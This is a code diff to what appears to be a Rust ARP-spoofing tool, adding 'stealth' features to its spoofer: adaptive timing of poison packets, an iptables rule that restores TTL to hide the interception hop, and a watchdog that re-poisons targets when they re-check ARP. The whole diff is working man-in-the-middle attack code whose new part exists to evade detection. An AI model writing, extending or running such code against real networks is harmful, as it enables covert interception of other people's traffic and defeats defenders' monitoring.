@@ -3,11 +3,13 @@ use std::net::Ipv4Addr;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 use pnet::datalink::{MacAddr, NetworkInterface};
 
 use crate::core::scanner;
+use crate::core::stealth::{self, StealthConfig, TtlGuard};
+use crate::core::timing::SpoofPacer;
 use crate::error::{HaunterError, Result};
 use crate::net::channel::Channel;
 use crate::net::{arp, interface, Device};
@@ -26,17 +28,21 @@ pub struct Spoofer {
     pub gateway_mac: MacAddr,
     pub targets: Vec<Device>,
     pub forward: bool,
+    stealth: Option<StealthConfig>,
 }
 
 impl Spoofer {
     /// Set up a spoofer for the given interface and gateway.
     ///
     /// If `target_ip` is `None`, all devices on the subnet are targeted.
+    /// Pass `Some(StealthConfig)` to enable anti-detection features,
+    /// or `None` for legacy fixed-interval behavior.
     pub fn new(
         iface: NetworkInterface,
         gateway_ip: Ipv4Addr,
         target_ip: Option<Ipv4Addr>,
         forward: bool,
+        stealth: Option<StealthConfig>,
     ) -> Result<Self> {
         let our_mac = iface
             .mac
@@ -72,6 +78,7 @@ impl Spoofer {
             gateway_mac,
             targets,
             forward,
+            stealth,
         })
     }
 
@@ -89,11 +96,73 @@ impl Spoofer {
             log("[*] IP forwarding DISABLED (traffic will be dropped).");
         }
 
+        // Install TTL guard (RAII — dropped at end of scope).
+        let _ttl_guard = match &self.stealth {
+            Some(cfg) if cfg.ttl_restore => {
+                let (guard, ok) = TtlGuard::install();
+                if ok {
+                    log("[*] TTL restoration enabled (iptables mangle rule installed).");
+                } else {
+                    log("[!] TTL restoration failed — iptables rule could not be installed.");
+                }
+                guard
+            }
+            _ => TtlGuard::noop(),
+        };
+
+        // Build pacer: adaptive timing or legacy fixed interval.
+        let mut pacer = match &self.stealth {
+            Some(cfg) => {
+                log("[*] Stealth mode: adaptive timing enabled.");
+                SpoofPacer::from_config(
+                    cfg.aggressive_lo,
+                    cfg.aggressive_hi,
+                    cfg.aggressive_duration,
+                    cfg.maintenance_lo,
+                    cfg.maintenance_hi,
+                    cfg.ramp_duration,
+                )
+            }
+            None => SpoofPacer::fixed(SPOOF_INTERVAL),
+        };
+
+        let watchdog_enabled = self
+            .stealth
+            .as_ref()
+            .map_or(false, |cfg| cfg.watchdog);
+
         let mut channel = Channel::open(&self.iface, CHANNEL_READ_TIMEOUT)?;
 
         while !stop.load(Ordering::Relaxed) {
             self.send_poison(&mut channel)?;
-            thread::sleep(SPOOF_INTERVAL);
+
+            // Poll the channel until the next interval deadline, checking for
+            // watchdog triggers and the stop flag on each 100ms wakeup.
+            let interval = pacer.next_interval();
+            let deadline = Instant::now() + interval;
+
+            while Instant::now() < deadline {
+                if stop.load(Ordering::Relaxed) {
+                    break;
+                }
+
+                if watchdog_enabled {
+                    if let Ok(Some(frame)) = channel.receive() {
+                        if stealth::is_watchdog_trigger(frame, self.gateway_ip, &self.targets) {
+                            log("[!] Watchdog: target re-verifying ARP — re-poisoning.");
+                            self.send_poison(&mut channel)?;
+                            pacer.reset_to_aggressive();
+                            break;
+                        }
+                    }
+                } else {
+                    // Legacy: just sleep until deadline.
+                    let remaining = deadline.saturating_duration_since(Instant::now());
+                    if !remaining.is_zero() {
+                        thread::sleep(remaining.min(CHANNEL_READ_TIMEOUT));
+                    }
+                }
+            }
         }
 
         log("[*] Restoring ARP tables...");
@@ -106,6 +175,7 @@ impl Spoofer {
         }
 
         log("[*] Done.");
+        // _ttl_guard drops here, removing iptables rule.
         Ok(())
     }
 
